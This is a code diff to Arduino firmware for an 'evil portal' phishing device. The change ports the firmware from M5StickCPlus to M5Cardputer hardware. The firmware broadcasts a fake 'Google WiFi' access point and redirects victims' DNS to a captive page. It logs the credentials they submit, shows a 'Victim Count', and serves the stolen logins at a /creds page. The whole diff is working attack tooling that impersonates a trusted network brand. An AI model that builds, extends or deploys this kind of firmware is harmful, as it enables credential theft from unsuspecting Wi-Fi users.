@@ -1,11 +1,42 @@
-#include <M5StickCPlus.h>
 #include <WiFi.h>
 #include <DNSServer.h>
 #include <WebServer.h>
 
+// #define M5STICKCPLUS
+#define M5CARDPUTER
+
+#if defined(M5STICKCPLUS) && defined(M5CARDPUTER)
+#error "Please define only one platform: M5STICKCPLUS or M5CARDPUTER"
+#endif
+
+#if defined(M5STICKCPLUS)
+#include <M5StickCPlus.h>
+
+#define DISPLAY M5.Lcd
+#define SPEAKER M5.Beep
+
+int BUILTIN_LED = 10;
+
+void blinkLed() { // The internal LED will blink 5 times when a password is received.
+  int count = 0;
+  while (count < 5) {
+    digitalWrite(BUILTIN_LED, LOW);
+    delay(500);
+    digitalWrite(BUILTIN_LED, HIGH);
+    delay(500);
+    count = count + 1;
+  }
+}
+#endif
+
+#if defined(M5CARDPUTER)
+#include <M5Cardputer.h>
+
+#define DISPLAY M5Cardputer.Display
+#define SPEAKER M5Cardputer.Speaker
+#endif
 
 // Based on https://github.com/n0xa/M5Stick-Stuph/blob/main/CaptPort/CaptPort.ino
-// modified font and text placement for StickC-Plus, further improvements added
 
 // User configuration
 #define SSID_NAME "Google WiFi"
@@ -19,7 +50,6 @@
 
 int capcount=0;
 int previous=-1; // stupid hack but wtfe
-int BUILTIN_LED = 10;
 
 // Init System Settings
 const byte HTTP_CODE = 200;
@@ -98,23 +128,20 @@ String clear() {
   return htmlContents("<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/creds>Back to Credentials</a></center><center><a style=\"color:blue\" href=/>Back to Index</a></center>");
 }
 
-void BLINK() { // The internal LED will blink 5 times when a password is received.
-  int count = 0;
-  while (count < 5) {
-    digitalWrite(BUILTIN_LED, LOW);
-    delay(500);
-    digitalWrite(BUILTIN_LED, HIGH);
-    delay(500);
-    count = count + 1;
-  }
-}
-
 void setup() {
+  #if defined (M5STICKCPLUS)
   M5.begin();
-  M5.Lcd.setRotation(3);
-  M5.Lcd.fillScreen(BLACK);
-  M5.Lcd.setSwapBytes(true);
-  M5.Lcd.setTextSize(2);
+  pinMode(BUILTIN_LED, OUTPUT);
+  digitalWrite(BUILTIN_LED, HIGH);
+  DISPLAY.setRotation(3);
+  #elif defined (M5CARDPUTER)
+  M5Cardputer.begin();
+  DISPLAY.setRotation(1);
+  #endif
+
+  DISPLAY.fillScreen(BLACK);
+  DISPLAY.setSwapBytes(true);
+  DISPLAY.setTextSize(2);
 
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
@@ -124,50 +151,74 @@ void setup() {
 
   webServer.on("/post", []() {
     capcount=capcount+1;
+    
     webServer.send(HTTP_CODE, "text/html", posted());
-    M5.Beep.tone(4000);
-    M5.Lcd.print("Victim Login");
+    
+    #if defined (M5STICKCPLUS)
+    SPEAKER.tone(4000);
+    #elif defined (M5CARDPUTER)
+    SPEAKER.tone(4000, 50);
+    #endif
+    
+    DISPLAY.print("Victim Login");
+    
     delay(50);
-    M5.Beep.mute();
-    BLINK();
-    M5.Lcd.fillScreen(BLACK);
+    
+    #if defined (M5STICKCPLUS)
+    SPEAKER.mute();
+    #endif
+    
+    DISPLAY.fillScreen(BLACK);
+    
+    #if defined (M5STICKCPLUS)
+    blinkLed();
+    #endif
   });
 
   webServer.on("/creds", []() {
     webServer.send(HTTP_CODE, "text/html", creds());
   });
+  
   webServer.on("/clear", []() {
     webServer.send(HTTP_CODE, "text/html", clear());
   });
+  
   webServer.onNotFound([]() {
     lastActivity = millis();
     webServer.send(HTTP_CODE, "text/html", index());
 
   });
+
   webServer.begin();
-  pinMode(BUILTIN_LED, OUTPUT);
-  digitalWrite(BUILTIN_LED, HIGH);
 }
 
 void loop() {
   if ((millis() - lastTick) > TICK_TIMER) {
+    
     lastTick = millis();
-    if(capcount != previous){
+    
+    if (capcount != previous) {
       previous = capcount;
     
-      M5.Lcd.fillScreen(BLACK);
-      M5.Lcd.setSwapBytes(true);
-      M5.Lcd.setTextSize(2);
-      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
-      M5.Lcd.setCursor(0, 10);
-      M5.Lcd.print("CAPTIVE PORTAL");
-      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
-      M5.Lcd.setCursor(0, 35);
-      M5.Lcd.print("WiFi IP: ");
-      M5.Lcd.println(APIP);
-      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
-      M5.Lcd.printf("Victim Count: %d\n", capcount);
+      printHome();
     }
   }
-  dnsServer.processNextRequest(); webServer.handleClient();
+
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+}
+
+void printHome() {
+  DISPLAY.fillScreen(BLACK);
+  DISPLAY.setSwapBytes(true);
+  DISPLAY.setTextSize(2);
+  DISPLAY.setTextColor(TFT_RED, TFT_BLACK);
+  DISPLAY.setCursor(0, 10);
+  DISPLAY.print("EVIL PORTAL");
+  DISPLAY.setTextColor(TFT_GREEN, TFT_BLACK);
+  DISPLAY.setCursor(0, 35);
+  DISPLAY.print("WiFi IP: ");
+  DISPLAY.println(APIP);
+  DISPLAY.printf("SSID: %s\n", SSID_NAME);
+  DISPLAY.printf("Victim Count: %d\n", capcount);
 }
